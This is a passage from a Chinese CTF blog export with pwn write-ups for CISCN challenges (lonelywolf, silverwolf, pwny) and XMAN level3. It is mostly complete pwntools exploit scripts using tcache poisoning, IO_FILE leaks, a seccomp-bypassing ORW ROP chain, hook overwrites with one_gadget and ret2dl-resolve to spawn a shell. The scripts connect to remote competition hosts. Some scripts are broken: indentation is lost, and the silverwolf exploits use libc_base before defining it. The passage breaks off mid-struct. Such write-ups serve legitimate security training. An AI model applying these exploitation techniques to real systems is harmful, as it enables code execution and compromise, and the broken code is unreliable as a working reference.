process('./lonelywolf')\nelf = ELF(\"./lonelywolf\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\nelse:\np = remote(\"114.116.231.128\",\"25285\")\nlibc = ELF(\"./libc-2.27.so\")\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"Your choice: \"\n\n\ndef add(idx, size):\n    sla(menu, \"1\")\n    sla(\"Index: \",str(idx))\n    sla(\"Size: \",str(size))\n\n\ndef delete(idx):\n    sla(menu, \"4\")\n    sla(\"Index: \", str(idx))\n\ndef show(idx):\n    sla(menu, \"3\")\n    sla(\"Index: \", str(idx))\n\ndef edit(idx,con):\n    sla(menu, \"2\")\n    sla(\"Index: \", str(idx))\n    sla(\"Content: \", str(con))\n\n#leak heap\nadd(0,8)\nadd(0,8)\ndelete(0)\nedit(0,\"A\"*8)\nshow(0)\nru(\"AAAAAAAA\")\nheap = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-0x10\n\n#control tcache struct,leak libc\nadd(0,0x78)\ndelete(0)\n#edit(0,p64(heap+0x2a0))\nedit(0,p64(heap+0x10))\nadd(0,0x78)\nadd(0,0x78)\nedit(0,\"\\x00\"*35+\"\\x07\")\ndelete(0)\nshow(0)\nru(\"Content: \")\nmalloc_hook = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-112\nfree_hook = malloc_hook+7352\nlibc = malloc_hook-0x3EBC30\nsystem = libc+0x4F550\nprint(\"free_hook:\",hex(free_hook))\nprint(hex(malloc_hook))\n\n#change malloc_hook to one_gadget\none_gadget = libc+0x10a41c\nedit(0,\"\\x02\"+\"\\x00\"*0x3f+p64(heap+0x280)+\"\\x00\"*0x30)\nadd(0,0x8)\ndelete(0)\nedit(0,p64(malloc_hook))\nadd(0,0x8)\nadd(0,0x8)\nedit(0,p64(one_gadget))\nadd(0,0x8)\np.interactive()\n```\n\n \n\n二、silverwolf：(比赛的时候没接触过seccomp保护，在学长的指导下也算是做出来了。)和上面一样，只是加了沙箱保护，用seccomp-tools dump ./silverwolf查看一下：\n\n```\n#注释头\n\nroot@241adce81c0a:/ctf/CISCN/silverwolf# seccomp-tools dump ./silverwolf\nline CODE JT JF K\n=================================\n0000: 0x20 0x00 0x00 0x00000004 A = arch\n0001: 0x15 0x00 0x07 0xc000003e if (A != ARCH_X86_64) goto 0009\n0002: 0x20 0x00 0x00 0x00000000 A = sys_number\n0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005\n0004: 0x15 0x00 0x04 0xffffffff if (A != 0xffffffff) goto 0009\n0005: 0x15 0x02 0x00 0x00000000 if (A == read) goto 0008\n0006: 0x15 0x01 0x00 0x00000001 if (A == write) goto 0008\n0007: 0x15 0x00 0x01 0x00000002 if (A != open) goto 0009\n0008: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n0009: 0x06 0x00 0x00 0x00000000 return KILL\n```\n\n可以看到只剩read和write权限了，同时题目提示flag在./flag，所以用read和write来读取和打印flag即可，利用orw。\n\n1.思路：\n\n(1)一样的，控tcache结构体泄露heap和libc。\n\n(2)这里由于开seccomp保护会申请挺多堆块的，所以bins和heap中都比较乱，再加上限制size，所以这里可以有两种方法：\n\n①一是控tcache，从0x10-0x80都给控了，加起来总共0x240，这里算出来是0x148，足够放下orw了。\n\n②二是利用IO_FILE泄露environ，得到栈地址，再泄露得到ELF基地址，计算BSS段，将size给改了，那么edit想输入多少数据就能输入多少，这样就可以在一个chunk中放下所有orw。\n\n2.贴下exp:\n\n①控tcache：\n\n```\nfrom pwn import *\nimport os\nimport struct\nimport random\nimport time\nimport sys\nimport signal\n\n#context.log_level = 'debug'\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nlocal = 1\nif local:\np = process('./silverwolf')\nelf = ELF(\"./silverwolf\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\nelse:\np = remote(\"114.116.231.128\",\"25285\")\nlibc = ELF(\"./libc-2.27.so\")\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nret = libc_base + 0x00000000000008aa # ret\npop_rdi_ret = libc_base + 0x00000000000215bf# pop rdi ; ret\npop_rsi_ret = libc_base + 0x0000000000023eea # pop rsi ; ret \npop_rdx_rsi_ret = libc_base + 0x0000000000130569 # pop rdx ; pop rsi ; ret\npop_rdx_ret = libc_base + 0x0000000000001b96 # pop rdx ; ret\nsyscall_ret = libc_base + 0x11B637\npop_rax_ret = libc_base + 0x0000000000043ae8\n\nmenu = \"Your choice: \"\n\n\ndef add(idx, size):\n    sla(menu, \"1\")\n    sla(\"Index: \",str(idx))\n    sla(\"Size: \",str(size))\n\n\ndef delete(idx):\n    sla(menu, \"4\")\n    sla(\"Index: \", str(idx))\n\ndef show(idx):\n    sla(menu, \"3\")\n    sla(\"Index: \", str(idx))\n\ndef edit(idx,con):\n    sla(menu, \"2\")\n    sla(\"Index: \", str(idx))\n    sla(\"Content: \", str(con))\n\n#leak heap\nadd(0,8)\nadd(0,8)\ndelete(0)\nedit(0,\"A\"*8)\nshow(0)\nru(\"AAAAAAAA\")\nheap = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-0x10\nprint(\"heap:\",hex(heap))\n\n#control tcache struct,leak libc\nadd(0,0x78)\ndelete(0)\n#edit(0,p64(heap+0x2a0))\nedit(0,p64(heap+0x10))\nadd(0,0x78)\nadd(0,0x78)\nedit(0,\"\\x00\"*35+\"\\x07\")\ndelete(0)\nshow(0)\nru(\"Content: \")\nmalloc_hook = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-112\nfree_hook = malloc_hook+7352\nlibc_base = malloc_hook-0x3EBC30\nsetcontext = libc_base+libc.sym['setcontext']\nsystem = libc_base+0x4F550\nIO_2_1_stdout_addr = libc_base + libc.symbols['_IO_2_1_stdout_']\nenviron = libc_base+libc.symbols['__environ']\nprint(\"IO_stdout:\",hex(IO_2_1_stdout_addr))\nprint(\"environ:\",hex(environ))\nprint(\"libc:\",hex(libc_base))\nprint(\"setcontext:\",hex(setcontext))\nprint(\"system:\",hex(system))\nprint(\"free_hook:\",hex(free_hook))\nprint(\"malloc_hook:\",hex(malloc_hook))\nprint(\"libsystem:\",hex(libc.sym[\"system\"]))\n\n#use IO_FILE,leak environ,elf_base,bss_addr,change size\nedit(0,\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x02\"+\"\\x04\"+ \"\\x00\"*0x39+\np64(0x0)+ #0x20\np64(0x0)+ #0x30\np64(0x0)+ #0x40\np64(0x0)+ #0x50\np64(0x0)+ #0x60\np64(IO_2_1_stdout_addr)+ #0x70\np64(heap+0x10)) #0x80\nadd(0,0x68)\n#delete(0)\n#edit(0,p64(malloc_hook))\n#add(0,0x8)\n#add(0,0x8)\nedit(0,p64(0xFBAD1800)+p64(IO_2_1_stdout_addr+131)*0x3+p64(environ)+p64(environ+0x8))\nstack = u64(p.recv(6)+\"\\x00\"+\"\\x00\")\nprint(\"stack\",hex(stack))\nedit(0,p64(0xFBAD1800) +p64(IO_2_1_stdout_addr+131)*0x3+p64(stack+168)+p64(stack+168+8))\nelf = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-0x40\nprint(\"elf\",hex(elf))\nbss = elf+0x202020\nsize_addr = bss+0x30\n\n#set free_hook to setcontext+53\nadd(0,0x78)\nedit(0,\"\\x01\"+\"\\x01\"+\"\\x00\"+\"\\x00\"+\"\\x01\"+\"\\x02\"+\"\\x04\"+ \"\\x00\"*0x39+\np64(free_hook)+ #0x20\np64(0x0)+ #0x30\np64(0x0)+ #0x40\np64(0x0)+ #0x50\np64(size_addr)+ #0x60\np64(0x0)+ #0x70\np64(heap+0x10)) #0x80\nadd(0,0x8)\nedit(0,p64(setcontext+53))\n\nadd(0,0x78)\nedit(0,\"\\x02\"+\"\\x01\"+\"\\x01\"+\"\\x01\"+\"\\x01\"+\"\\x02\"+\"\\x04\"+\"\\x02\" +\"\\x00\"*0x38+\np64(heap+0x2e0)+ #0x20\np64(heap+0x2e0+0x10)+ #0x30 \np64(heap+0x2e0+0x30)+ #0x40 \np64(heap+0x2e0+0x60)+ #0x50\np64(heap+0x2e0+0xa0)+ #0x60\np64(heap+0x2e0+0xf0)+ #0x70 \np64(heap+0x2e0)) #0x80\n\n\nfake_rsp = heap+0x2e0+0xb0+0x10\nflag = heap+0x2e0+0xb0\n\norw = \"a\"*0xa0 + p64(fake_rsp)+p64(ret)\norw += './flag\\x00\\x00'\norw += p64(0)\norw += p64(pop_rdi_ret) + p64(flag)\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_ret) + p64(0x30)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\nprint(len(orw))\n\n#copy the orw to heap+0x2e0\nadd(0,0x10)\nedit(0,orw[0:0x10])\n\nadd(0,0x20)\nedit(0,orw[0x10:0x30])\n\nadd(0,0x30)\nedit(0,orw[0x30:0x60])\n\nadd(0,0x40)\nedit(0,orw[0x60:0xa0])\n\nadd(0,0x50)\nedit(0,orw[0xa0:0xf0])\n\nadd(0,0x60)\nedit(0,orw[0xf0:0x150])\n\nadd(0,0x78)\ndelete(0)\n\np.interactive()\n```\n\n \n\n②修改size：\n\n```\nfrom pwn import *\nimport os\nimport struct\nimport random\nimport time\nimport sys\nimport signal\n\n#context.log_level = 'debug'\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nlocal = 1\nif local:\np = process('./silverwolf')\nelf = ELF(\"./silverwolf\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\nelse:\np = remote(\"114.116.231.128\",\"25285\")\nlibc = ELF(\"./libc-2.27.so\")\n\n\n#ROPgadget\nret = libc_base + 0x00000000000008aa # ret\npop_rdi_ret = libc_base + 0x00000000000215bf# pop rdi ; ret\npop_rsi_ret = libc_base + 0x0000000000023eea # pop rsi ; ret \npop_rdx_rsi_ret = libc_base + 0x0000000000130569 # pop rdx ; pop rsi ; ret\npop_rdx_ret = libc_base + 0x0000000000001b96 # pop rdx ; ret\nsyscall_ret = libc_base + 0x11B637\npop_rax_ret = libc_base + 0x0000000000043ae8\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"Your choice: \"\n\n\ndef add(idx, size):\n    sla(menu, \"1\")\n    sla(\"Index: \",str(idx))\n    sla(\"Size: \",str(size))\n\n\ndef delete(idx):\n    sla(menu, \"4\")\n    sla(\"Index: \", str(idx))\n\ndef show(idx):\n    sla(menu, \"3\")\n    sla(\"Index: \", str(idx))\n\ndef edit(idx,con):\n    sla(menu, \"2\")\n    sla(\"Index: \", str(idx))\n    sla(\"Content: \", str(con))\n\n#leak heap\nadd(0,8)\nadd(0,8)\ndelete(0)\nedit(0,\"A\"*8)\nshow(0)\nru(\"AAAAAAAA\")\nheap = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-0x10\nprint(\"heap:\",hex(heap))\n\n#control tcache struct,leak libc\nadd(0,0x78)\ndelete(0)\n#edit(0,p64(heap+0x2a0))\nedit(0,p64(heap+0x10))\nadd(0,0x78)\nadd(0,0x78)\nedit(0,\"\\x00\"*35+\"\\x07\")\ndelete(0)\nshow(0)\nru(\"Content: \")\nmalloc_hook = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-112\nfree_hook = malloc_hook+7352\nlibc_base = malloc_hook-0x3EBC30\nsetcontext = libc_base+libc.sym['setcontext']\nsystem = libc_base+0x4F550\nIO_2_1_stdout_addr = libc_base + libc.symbols['_IO_2_1_stdout_']\nenviron = libc_base+libc.symbols['__environ']\nprint(\"IO_stdout:\",hex(IO_2_1_stdout_addr))\nprint(\"environ:\",hex(environ))\nprint(\"libc:\",hex(libc_base))\nprint(\"setcontext:\",hex(setcontext))\nprint(\"system:\",hex(system))\nprint(\"free_hook:\",hex(free_hook))\nprint(\"malloc_hook:\",hex(malloc_hook))\nprint(\"libsystem:\",hex(libc.sym[\"system\"]))\n\n#use IO_FILE,leak environ,elf_base,bss_addr,change size\nedit(0,\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x02\"+\"\\x04\"+ \"\\x00\"*0x39+\np64(0x0)+ #0x20\np64(0x0)+ #0x30\np64(0x0)+ #0x40\np64(0x0)+ #0x50\np64(0x0)+ #0x60\np64(heap+0x10)+ #0x70\np64(IO_2_1_stdout_addr)) #0x80\nadd(0,0x78)\n#delete(0)\n#edit(0,p64(malloc_hook))\n#add(0,0x8)\n#add(0,0x8)\nedit(0,p64(0xFBAD1800)+p64(IO_2_1_stdout_addr+131)*0x3+p64(environ)+p64(environ+0x8))\nstack = u64(p.recv(6)+\"\\x00\"+\"\\x00\")\nprint(\"stack\",hex(stack))\nedit(0,p64(0xFBAD1800) +p64(IO_2_1_stdout_addr+131)*0x3+p64(stack+168)+p64(stack+168+8))\nelf = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-0x40\nprint(\"elf\",hex(elf))\nbss = elf+0x202020\nsize_addr = bss+0x30\n\n#set free_hook to setcontext+53\nadd(0,0x68)\nedit(0,\"\\x01\"+\"\\x01\"+\"\\x00\"+\"\\x00\"+\"\\x01\"+\"\\x02\"+\"\\x04\"+ \"\\x00\"*0x39+\np64(free_hook)+ #0x20\np64(heap+0x260)+ #0x30\np64(0x0)+ #0x40\np64(0x0)+ #0x50\np64(size_addr)) #0x60\nadd(0,0x8)\nedit(0,p64(setcontext+53))\n\n#get final chunk\nadd(0,0x58)\nedit(0,p64(0x500)+p64(heap+0x2e0))\n\n\nfake_rsp = heap+0x2e0+0xb0+0x10\nflag = heap+0x2e0+0xb0\norw = \"a\"*0xa0 + p64(fake_rsp)+p64(ret)\norw += './flag\\x00\\x00'\norw += p64(0)\norw += p64(pop_rdi_ret) + p64(flag)\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_ret) + p64(0x30)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\n\nedit(0,orw)\ndelete(0)\n\np.interactive()\n```\n\n▲写得有点乱，为了达到效果中间加了不少不必要的，慢慢来吧，后面估计就能更好控tcache了。\n\n三、pwnmy：越界任意写\n\n这道题很有意思，用到了很多知识点。\n\n1.关于read函数：read(fd,&var,amount)\n\nread函数中的fd如果不为0，那么如果fd对应的Filehandle中没有数据，相当于没有被执行，如果有数据，那么就相当于是复制，将fd对应Filehandle中的数据复制amount个字节给var。其实本质来说read就是一个复制函数，只是fd为0代表标准输入，所以会从我们的输入中获取数据来复制。所以很多时候能够用到fd来出题。\n\n这里就用到题目的write函数，第一次write(256)越界，将fd对应的Filehandle中的随机值复制给byte_202860，此时byte_202860中的值为result = open(\"/dev/urandom\", 0);出来的随机值。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191448117.png)\n\n之后再次write(256)越界，此时byte_202860从随机值中取一个字节：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191448471.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191448783.png)\n\n这里复现时为0x15，但是0x15没有对应的Filehandle，那么依据read函数的性质，相当于没有运行，所以byte_202860就会被赋值为0，这也就是为什么要write(256)两次的原因。\n\n2.关于getshell方法：\n\n(1)利用scanf函数，这个函数在接收过多输入时，会申请堆块，可以利用这个来用malloc和realloc调整栈帧配合one_gadget来getshell。因为我调试的时候所有的one_gadget都不满足。\n\n(2)利用exit函数，函数流为：\n\nexit()->__run_exit_handlers->_dl_fini->*******[_dl_rtld_lock_recursive/_dl_rtld_unlock_recursive]\n\n而[_dl_rtld_lock_recursive/_dl_rtld_unlock_recursive]位于结构体_rtld_global中，可读可写，所以利用任意写改掉_rtld_global中的函数指针为one_gadget即可。但是这里的One_gadget也都不符合，所以需要用到一些gadget来调整，这里自己找吧。\n\n推荐：https://www.cnblogs.com/bhxdn/p/14222558.html\n\n(3)利用environ，可以利用libc上的environ来获取栈地址，然后直接改栈上的返回地址吗，对应调整栈帧即可。这里改write的返回地址可以直接getshell。\n\n4.关于泄露地址：\n\n(1)libc地址：可以看到bss段上保存着三个标准符号：012->stdout,stdin,stderr。而这三个bss段变量在所有libc中都有，并且里面保存着对应的结构体的地址：\n\n_IO_2_1_stdout,_IO_2_1_stdin,_IO_2_1_stderr\n\n所以可以利用任意读来获取libc地址。\n\n(2)elf地址：由于之后需要修改libc地址吗，所以一定需要qword_202060的地址，而这个elf地址就只能往后找了，用qword_202060[v2]的相对偏移往后找了，这里自己找。\n\n▲综上所述，这道题也差不多了，考点还是挺多的，方法也挺多。\n\n```\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./pwny\"\nlibc_file = \"./libc-2.27.so\"\n#libc_file = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)  \n\n#libcsearcher use\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"119.3.81.43\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\n\n\ndef menu(idx):\n    sla(\": \", str(idx))\n\ndef write_fd(idx):\n    menu(2)\n    sla(\": \", str(idx))\n\n\ndef write(idx, con):\n    menu(2)\n    sla(\": \", str(idx))\n    sd(con)\n\ndef read(idx):\n    menu(1)\n    sa(\": \", idx)\n\nwrite_fd(256)\ngdb.attach(p)\npause()\n\nwrite_fd(256)\n\n#leak stderr\nread(p64(-4&0xffffffffffffffff))\nru(\": \")\nstderr_addr = int(ru(\"\\n\"), 16)\n\n#leak elf\nread(p64(-0xb&0xffffffffffffffff))\nru(\": \")\nelf_base = int(ru(\"\\n\"), 16) -0x202008\n\nlog.info(\"stderr_addr:0x%x\"%stderr_addr)\nlog.info(\"elf_base:0x%x\"%elf_base)\n\nqword_202060_addr = elf_base+0x202060\n\nobj = LibcSearcher(\"_IO_2_1_stderr_\", stderr_addr)\nlibc_base = stderr_addr-obj.dump('_IO_2_1_stderr_')\nlog.info(\"libc_base:0x%x\"%libc_base)\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\n\nmalloc_hook_addr = libc_base + obj.dump(\"__malloc_hook\")\nrealloc_hook_addr = libc_base + obj.dump(\"__realloc_hook\")\nrealloc_addr = libc_base + obj.dump(\"realloc\")\n_rtld_global_addr = libc_base + obj.dump(\"_rtld_global_\")\n# offset1 = (_rtld_global_addr+3840 - qword_202060_addr)/8\n# offset2 = (_rtld_global_addr+3848 - qword_202060_addr)/8\noffset_malloc = (malloc_hook_addr-qword_202060_addr)/8\noffset_realloc_hook = (realloc_hook_addr-qword_202060_addr)/8\n# log.info(\"offset1:0x%x\"%offset1)\n# log.info(\"offset1:0x%x\"%offset2)\n\nlog.info(\"_rtld_global_addr:0x%x\"%_rtld_global_addr)\nlog.info(\"realloc_addr:0x%x\"%realloc_addr)\nlog.info(\"malloc_hook_addr:0x%x\"%malloc_hook_addr)\nlog.info(\"realloc_hook_addr:0x%x\"%realloc_hook_addr)\n\none_gadget = libc_base + 0x10a41c\nlog.info(\"one_gadget:0x%x\"%one_gadget)\n\n# write(offset1,p64(one_gadget))\n# write(offset2,p64(one_gadget))\nwrite(offset_malloc,p64(realloc_addr+0x4))\nwrite(offset_realloc_hook,p64(one_gadget))\n\n# gdb.attach(p)\n# pause()\n\nsl(\"9\"*0x1000)\np.interactive()\n```\n\n \n\n \n","tags":["比赛"],"categories":["PWN"]},{"title":"XMAN 2016-level3(32+64)","url":"/2021/08/14/XMAN 2016-level3(32+64)/","content":"\n# 一、32位程序\n\n## 1.漏洞分析\n\n- 常规checksec，开了Partial RELRO和NX，IDA找漏洞，很明显在vulnerable_function函数中存在栈溢出：\n\n```\n#注释头\n\nchar buf; // [esp+0h] [ebp-88h]\n----------------------------------------------------------------------\nreturn read(0, &buf, 0x100u);\n```\n\n- 很多种方法，这里选择用ret2dl-resolve来尝试解决。\n\n- 关于ret2dl-resolve介绍，篇幅太长，不说了，后面放资料链接，介绍一下装载流程：\n  - 通过struct link_map *l获得.dynsym、.dynstr、.rel.plt地址\n  - 通过reloc_arg+.rel.plt地址取得函数对应的Elf32_Rel指针，记作reloc\n  - 通过reloc->r_info和.dynsym地址取得函数对应的Elf32_Sym指针，记作sym\n  - 检查r_info最低位是否为7\n  - 检查(sym->st_other)&0x03是否为0\n  - 通过strtab+(sym->st_name)获得函数对应的字符串，进行查找，找到后赋值给rel_addr,最后调用这个函数。\n\n## 2.EXP分析\n\n首先思考exp编写的攻击思路，由于栈溢出的比较少，而ret2dl-resolve攻击需要构造几个结构体，所占空间较大，所以这里进行栈劫持，将栈劫持到程序运行过程中生成的bss段上。之后再在栈上布置结构体和必要数据，重新执行延迟绑定，劫持动态装载，将write函数装载成system函数，并且在劫持的同时将Binsh字符串放在栈上，这样劫持完成后就直接调用system函数，参数就是binsh。\n\n### (1)寻找数据地址：\n\n```\n#注释头\n\nwrite_got = 0x0804a018\nread_plt = 0x08048310\nplt0_addr = 0x08048300\nleave_ret = 0x08048482\npop3_ret = 0x08048519\npop_ebp_ret = 0x0804851b\nnew_stack_addr = 0x0804a500 \n#程序运行起来才会有，bss与got表相邻，_dl_fixup中会降低栈后传参，设置离bss首地址远一点防止参数写入非法地址出错\n\nrelplt_addr = 0x080482b0 \n#.rel.plt的首地址，通过计算首地址和新栈上我们伪造的结构体Elf32_Rel偏移构造reloc_arg\n\ndynsym_addr = 0x080481cc \n#.dynsym的首地址，通过计算首地址和新栈上我们伪造的Elf32_Sym结构体偏移来构造Elf32_Rel.r_info\n\ndynstr_addr = 0x0804822c \n#.dynstr的首地址，通过计算首地址和新栈上我们伪造的函数名字符串system偏移来构造Elf32_Sym.st_name\n```\n\n这里寻找的relplt_addr，dynsym_addr，dynstr_addr一般都是位于ELF文件头部的LOAD段。用readelf -S binary也可以看到：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516027.jpeg)\n\n- relplt_addr：0x080482b0\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516591.jpeg)\n\n- dynsym_addr：0x080481cc\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516336.jpeg)\n\n- dynstr_addr：0x0804822c\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516123.jpeg)\n\n### (2)栈劫持：\n\n```\n#注释头\n\npayload = \"\"\npayload += 'A'*140 #padding\npayload += p32(read_plt) \n#调用read函数往新栈写值，防止leave; retn到新栈后出现ret到地址0上导致出错\npayload += p32(pop3_ret) \n#read函数返回地址，从栈上弹出三个参数从而能够将esp拉到pop_ebp_ret的地方来执行\npayload += p32(0) #fd = 0\npayload += p32(new_stack_addr) #buf = new_stack_addr\npayload += p32(0x400) #size = 0x400\npayload += p32(pop_ebp_ret)\n#把新栈顶给ebp\npayload += p32(new_stack_addr)\npayload += p32(leave_ret)\n#模拟函数返回，利用leave指令把ebp的值赋给esp，完成栈劫持，同时ebp指向第二段payload的第一个内容，eip为第二段payload中的plt0_addr\n\nio.send(payload) #此时程序会停在使用payload调用的read函数处等待输入数据\n```\n\n### (3)伪造两个结构体和必要的数据：\n\n```\n#注释头\n\n\nfake_Elf32_Rel_addr = new_stack_addr + 0x50\n#在新栈上选择一块空间放伪造的Elf32_Rel结构体，结构体大小为8字节\n\nfake_Elf32_Sym_addr = new_stack_addr + 0x5c \n#在伪造的Elf32_Rel结构体后面接上伪造的Elf32_Sym结构体，结构体大小为0x10字节\n\nfake_reloc_arg = fake_Elf32_Rel_addr - relplt_addr \n#计算伪造的reloc_arg\n\nfake_st_name_addr = new_stack_addr + 0x6c - dynstr_addr \n#伪造的Elf32_Sym结构体后面接上伪造的函数名字符串system_addr \n\nfake_r_info = ((fake_Elf32_Sym_addr - dynsym_addr)/0x10) << 8 | 0x7 \n#伪造r_info，偏移要计算成下标，除以Elf32_Sym的大小，最后一字节为0x7\n\n\nfake_Elf32_Rel_data = \"\"\nfake_Elf32_Rel_data += p32(write_got) \n#r_offset = write_got，以免重定位完毕回填got表的时候出现非法内存访问错误\nfake_Elf32_Rel_data += p32(fake_r_info)\n\nfake_Elf32_Sym_data = \"\"\nfake_Elf32_Sym_data += p32(fake_st_name_addr)\nfake_Elf32_Sym_data += p32(0) \n#后面的数据直接套用write函数的Elf32_Sym结构体\nfake_Elf32_Sym_data += p32(0)\nfake_Elf32_Sym_data += p8(0x12)\nfake_Elf32_Sym_data += p8(0)\nfake_Elf32_Sym_data += p16(0)\n\nbinsh_addr = new_stack_addr + 0x74 #把/bin/sh\\x00字符串放在最后面\n```\n\n- reloc_arg作用：作为偏移值，与relplt_addr相加得到ELF32_Rel结构体的地址。这里设置成fake_reloc_arg = fake_Elf32_Rel_addr - relplt_addr，那么相加之后就可以直达我们设置的fake_ELF32_Rel结构体位置。\n\n- st_name_addr作用：作为偏移值，与dynstr_addr相加得到存放函数名的地址。如果按照原本的重定位，那么此处计算之后存放的应该是write，所以这里将其改为system，放在所有数据的最后面，将地址存放到fake_Elf32_Sym结构体中，设置为fake_st_name_addr = new_stack_addr + 0x6c - dynstr_addr，这样相加之后就会定位到new_stack_addr + 0x6c，即我们劫持栈上的system字符串地址处，从而劫持装载。\n\n- r_info作用：作为偏移值，使得结构体数组Elf32_Sym[r_info>>8]来找到存放write的结构体Elf32_Sym。我们知道结构体数组寻址方式其实就是addr = head_addr + size*indx，也就是首地址加上数组中元素大小乘以索引。这里由于伪造了Elf32_Sym结构体，所以我们的r_info>>8 = indx应该是addr - head_addr/size，对应的就是(fake_Elf32_Sym_addr - dynsym_addr)/0x10，得到最终的r_info为((fake_Elf32_Sym_addr - dynsym_addr)/0x10)<<8。\n\n- 设置write的Elf32_Sym结构体时，可以通过命令readelf -r binary，找到write的r_info偏移为407：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516168.jpeg)\n\n之后输入objdump -s -j .dynsym level3，查找偏移为4的Elf32_Sym结构体内容：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516927.jpeg)\n\n这里就是0x804820c，对应的内容为：\n\n```\n#注释头\n\n\nst_name = 31000000\nst_value = 00000000\nst_size = 00000000\nst_info = 12\nst_other = 00\nst_shndx = 0000\n```\n\n▲其实在IDA中看的更清楚：![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516336.jpeg)\n\n同时由于搜寻数据时，需要查找类型R_386_JUMP_SLOT，该索引为r_info的最后一个字节，所以需要将r_info的最后一个字节设置为0x07，来通过检查。\n\n▲以下为两个结构体内容：\n\n```\n#注释头\n\n#Elf32_Rel结构体：大小为0x08\ntypedef struct {\n    Elf32_Addr r_offset;   // 对于可执行文件，此值为虚拟地址\n    Elf32_Word r_info;     // 符号表索引\n} Elf32_Rel;\n\n\n#Elf32_Sym结构体：大小为0x10\ntypedef struct\n{\n    Elf32_Word st_name;      // Symbol name(string tbl index)\n    Elf32_Addr st_value;     // Symbol value\n    Elf32_Word st_size;      // Symbol size\n    unsigned char 